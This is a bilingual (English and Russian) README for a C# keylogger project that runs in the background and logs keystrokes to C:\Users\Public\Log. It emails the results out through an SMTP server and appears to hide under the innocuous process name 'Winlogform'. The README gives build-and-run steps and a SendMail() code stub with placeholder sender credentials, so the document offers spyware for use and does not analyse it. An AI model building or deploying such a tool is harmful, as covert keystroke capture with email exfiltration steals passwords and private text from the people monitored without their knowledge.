# C#-Keylogger-send-email-report


Primitive keylogger on C #, running in the background with the ability to send the result to the mail.

# Using
Clone the repository and open the project in Visual Studio, fill in the mailing data, build the project and run the executable file.
The data file is stored in the folder "C: \ Users \ Public \ Log"
        
        void SendMail()
        {
            // set email from which the letter will be sent... end name
            MailAddress from = new MailAddress("mailOut.com", "Tom");
            // set your email
            MailAddress to = new MailAddress("mailIn.com");
            // smtp-server and port "mailOut.com"
            SmtpClient smtp = new SmtpClient("smtp.mail.ru", 587);
            // loggin and password
            smtp.Credentials = new NetworkCredential("mailOut.com", "password");
        }
# To exit / stop Keylogger
To exit the keylogger, go to the task manager, find the "Winlogform" process and clear the task.

#
# keylogger на C#
Примитивный keylogger на C#, работающий в фоновом режиме с возможностью отправки результата на почту.

# Использование
Клонируйте репозиторий и откройте проект в Visual Studio, заполните данные почтовой отправки, соберите проект и запустите исполняемый файл.
Файл с данными хранится в папке "C:\Users\Public\Log"
        
        void SendMail()
        {
            // отправитель - устанавливаем адрес и отображаемое в письме имя
            MailAddress from = new MailAddress("mailOut.com", "Tom");
            // кому отправляем
            MailAddress to = new MailAddress("mailIn.com");
            // адрес smtp-сервера и порт, с которого будем отправлять письмо
            SmtpClient smtp = new SmtpClient("smtp.mail.ru", 587);
            // логин и пароль
            smtp.Credentials = new NetworkCredential("mailOut.com", "password");
        }
# Выход / Остановка Кейлоггера
Для выхода из кейлоггера, перейдите в диспечер задач, найдите процесс "Winlogform" и снимите задачу.
